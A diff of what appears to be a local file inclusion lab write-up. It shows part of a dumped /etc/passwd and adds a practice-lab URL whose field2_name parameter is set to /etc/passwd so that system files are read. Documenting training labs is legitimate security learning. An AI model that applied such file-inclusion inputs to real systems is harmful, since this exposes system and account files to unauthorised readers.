@@ -82,3 +82,11 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 brandon:x:1003:1004:,,,:/home/brandon:/bin/bash
 mayank_pandey01:x:1004:1005::/var/www/html/labs/mayank_pandey01:/usr/sbin/nologin
 ```
+
+### Special Lab
+
+Default URL :- `https://hackxpert.com/labs/LFI/rat.php?field2_name=image0.jpg`
+
+Vul URL :- `https://hackxpert.com/labs/LFI/rat.php?field2_name=/etc/passwd`
+
+![image](https://user-images.githubusercontent.com/60841283/151114502-0a304f6a-8736-4070-a7f4-ac47b5ca1662.png)
